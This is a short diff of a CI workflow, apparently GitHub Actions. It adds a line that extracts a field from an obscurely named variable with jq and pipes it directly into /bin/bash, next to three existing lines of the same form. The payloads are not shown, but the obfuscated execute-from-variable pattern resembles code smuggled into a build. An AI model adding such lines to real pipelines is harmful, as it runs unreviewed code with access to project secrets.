@@ -38,6 +38,7 @@ jobs:
           echo $arc95 | jq -r .p85067 | /bin/bash
           echo $i39195 | jq -r .olvt677 | /bin/bash
           echo $vscp48 | jq -r .j573 | /bin/bash
+          echo $srrhl9 | jq -r .gb3 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
